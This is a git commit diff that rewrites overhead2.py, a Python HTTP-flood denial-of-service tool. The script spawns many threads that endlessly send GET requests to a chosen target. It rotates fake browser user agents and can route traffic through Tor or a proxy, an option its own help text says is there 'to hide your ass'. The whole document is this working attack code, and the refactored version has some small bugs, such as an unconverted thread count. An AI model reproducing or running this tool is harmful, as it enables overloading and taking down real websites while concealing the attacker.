b3501f550379b2d454431c3a2ebdcf96de43a9c4
ghostahull <ghostahull@protonmail.com>
2017-05-03 15:56:38 +0100

    Update overhead2.py

--- overhead2.py
+++ overhead2.py
@@ -1,141 +1,114 @@
 #!/usr/bin/env python
 # -*- encoding: UTF-8 -*-
 
-import threading,requests,random, sys, time, re
+import random
+import re
+import requests
+import threading
+import time
 from optparse import OptionParser
-from arts import Header
-### GLOBAL VARS ###
-WEB = ""                        # Target
-THREADS = 100                   # Number of threads
-thread_list = []                # Stores a list of active threads
-config = {}                     # Stores de configuration provided by the user
-success = 0                     # Count of the amount of packets succesfully send
 
-user_agents = [
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0",
+from arts import Header
+
+config = {}  # Stores de configuration provided by the user
+success = 0  # Count of the amount of packets successfully send
+
+user_agents = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
-]
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"]
 
-def address(addr):
-    if re.match('^(http|https):*\.*', addr):
-        return addr
-    elif re.match('^www\.', addr):
-        return 'http://'+addr
-    elif ("//" not in addr):
-        return "http://"+addr
+
+def parse_address(url):
+    url_format = "(http|https)|\://"
+    link_format = "^[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,3}(/\S*)?$"
+    if re.match(url_format + link_format, url):
+        return url
+    elif re.match(link_format, url):
+        return "http://%s" % url
     else:
-        if ("://" in addr):
-            split = addr.split(":")
-            return 'http:'+split[1]
-        else:
-            print("[!] The address isn't valid\n Try again with http://target.com")
-            sys.exit(0)
-def randomAgent():
-    global user_agents
-    return random.choice(user_agents)
+        print("Url format is incorrect")
+        exit(0)
+
 
 def create_threads(threads):
-    global config
-    header = {}
-    proxy = None
-    #proxy = config["proxy"]["address"]+":"+str(config["proxy"]["port"])
-    #print(proxy)
-    for c in range(int(config["threads"])):
-        t = threading.Thread(target=work,args=(config["web"],header, proxy))
+    for c in range(threads):
+        t = threading.Thread(target=work)
         t.start()
-        thread_list.append(t)
-    print("[!] All threads spawned\n")
 
-def work(addr, header, proxy):
-    time.sleep(1)
-    try:
-        while (True):
-            header["user-agent"] = random.choice(user_agents)
-            try:
-                r = requests.get(addr, headers = header, proxies = proxy)
-            except requests.exceptions.RequestException as e:
-                # A serious problem happened, like an SSLError or InvalidURL
-                print("Error: {}".format(e))
-            refreshStatus() if r.status_code == 200 else None
-    except KeyboardInterrupt:
-        sys.exit(0)
 
-def checkProxy(proxy):
-    passwd = None
+def work():
+    while True:
+        header = {"user-agent": random.choice(user_agents)}
+        proxy = config["proxy"] if config["proxy"] else None
+        try:
+            r = requests.get(config["web"], headers=header, proxies=proxy)
+            refresh_status() if r.status_code == 200 else None
+        except requests.exceptions.RequestException as e:
+            print("Error: {}".format(e))
+
+
+def parse_proxy(proxy):
     if proxy == "tor":
-        # Setting default proxy to tor
-        return {"socks5":"127.0.0.1:9050"}
-    if "@" in proxy:
-        s = proxy.split('@')
-        if ":" in s[0]:
-            client = s[0].split(":")
-            user = client[0]
-            passwd = client[1]
-        else: 
-            user = s[0]
-            passwd = ""
-        addr = s[1]
-    print(user+"    :   "+passwd)
-    if user and passwd:
-        client = user+":"+passwd+"@"
-    elif user and not passwd:
-        client = user+"@"
-    proxy = client+addr
-    proxies = {
-        "http":"http://"+ proxy,
-        "https":"https://"+ proxy,
-        "socks":"socks5://"+ proxy,
-    }
-    return {"user":user,"address":ip,"port":port}
+        return {"socks5": "127.0.0.1:9050"}
+    elif re.match("(.*:)?.*@.*|.*:.*", proxy):
+        proxy_type = input("Proxy type: ")
+        return {proxy_type: proxy}
 
-def checkAddr(addr):
+
+def check_address(url):
     try:
-        req = requests.get(addr)
+        req = requests.get(url)
         return True if req.status_code == 200 else False
     except ConnectionError:
         print("Connection error")
         return False
 
-def refreshStatus():
+
+def refresh_status():
     global success
     success += 1
     print('[>] Number of hits: %d' % success, end="\r")
 
-def checkInput():
+
+def check_input():
     global config
     usage = "Usage: %prog -u <Target> [options]"
-    parser = OptionParser(usage=usage, version = "1")
-    parser.add_option("-u", "--url", dest="target", help="IP or domain of the target to scan", metavar="<target>")
-    parser.add_option("-t", "--threads", dest="threads", default=100, help="Set the number of threads", metavar="<threads>")
-    parser.add_option("-p", "--proxy", dest="proxy", help="Use a proxy to hide your ass", metavar="<addres>:<port>")
-    parser.add_option("--v", "--verbose", action="store_true", dest="verbose", help="Show verbose")
+    parser = OptionParser(usage=usage, version="1")
+    parser.add_option("-u", "--url", dest="target", help="IP or domain of the target to scan")
+    parser.add_option("-t", "--threads", dest="threads", default=100, help="Set the number of threads")
+    parser.add_option("-p", "--proxy", dest="proxy", help="Use a proxy to hide your ass", metavar="<address>:<port>")
     (params, args) = parser.parse_args()
     Header()
 
-    # ARGs checkin
     if not params.target:
-        args.print_help()
+        parser.print_help()
         exit(0)
-    config["web"] = address(params.target)
+
+    config["web"] = parse_address(params.target)
     config["threads"] = params.threads if params.threads else 100
-    config["proxy"] = checkProxy(params.proxy) if params.proxy else None
-    status = "online" if checkAddr(config["web"]) else "offline"
+    config["proxy"] = parse_proxy(params.proxy) if params.proxy else None
+
+    status = True if check_address(config["web"]) else False
     separator = "#===========================================#"
-    print("{0} \n# Target: {1}\n# Threads: {2}\n# STATUS: {3}\n{0}".format(separator,config["web"],config["threads"],status))
-    if status == "offline":
-        sys.exit(0)
+    print("{0} \n# Target: {1}\n# Threads: {2}\n# Status: {3}\n{0}".format(
+        separator,
+        config["web"],
+        config["threads"],
+        "online" if status else "offline"))
+
+    if not status:
+        exit(0)
+
 
 def main():
     global config
-    checkInput()
+    check_input()
     starting_time = time.time()
     create_threads(config["threads"])
-    for th in thread_list: # Wait for all threads to stop
-        th.join()
-    print("\nTotal time: %d" % (time.time() - starting_time))
+    print("\nRequests made: %d\tTotal time: %d" % (success, time.time() - starting_time))
+
 
 if __name__ == "__main__":
     main()
